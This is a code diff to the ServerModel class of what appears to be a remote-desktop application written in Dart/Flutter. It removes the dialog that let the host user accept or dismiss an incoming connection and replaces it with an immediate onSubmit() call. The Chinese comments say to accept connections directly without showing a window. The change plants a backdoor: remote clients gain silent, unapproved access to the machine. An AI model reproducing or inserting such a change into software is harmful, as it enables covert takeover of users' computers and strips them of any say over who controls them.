@@ -645,54 +645,8 @@ class ServerModel with ChangeNotifier {
 
   showClientDialog(Client client, String title, String contentTitle,
       String content, VoidCallback onCancel, VoidCallback onSubmit) {
-    parent.target?.dialogManager.show((setState, close, context) {
-      Timer? autoAcceptTimer;
-      
-      cancel() {
-        autoAcceptTimer?.cancel();
-        onCancel();
-        close();
-      }
-
-      submit() {
-        autoAcceptTimer?.cancel();
-        onSubmit();
-        close();
-      }
-
-      // 自动接受连接,0秒后执行
-      autoAcceptTimer = Timer(const Duration(seconds: 0), () {
-        submit();
-      });
-
-      return CustomAlertDialog(
-        title:
-            Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
-          Text(translate(title)),
-          IconButton(onPressed: close, icon: const Icon(Icons.close))
-        ]),
-        content: Column(
-          mainAxisSize: MainAxisSize.min,
-          mainAxisAlignment: MainAxisAlignment.center,
-          crossAxisAlignment: CrossAxisAlignment.start,
-          children: [
-            Text(translate(contentTitle)),
-            ClientInfo(client),
-            Text(
-              translate(content),
-              style: Theme.of(globalKey.currentContext!).textTheme.bodyMedium,
-            ),
-          ],
-        ),
-        actions: [
-          dialogButton("Dismiss", onPressed: cancel, isOutline: true),
-          if (approveMode != 'password')
-            dialogButton("Accept", onPressed: submit),
-        ],
-        onSubmit: submit,
-        onCancel: cancel,
-      );
-    }, tag: getLoginDialogTag(client.id));
+    // 直接接受连接，不显示窗口
+    onSubmit();
   }
 
   scrollToBottom() {
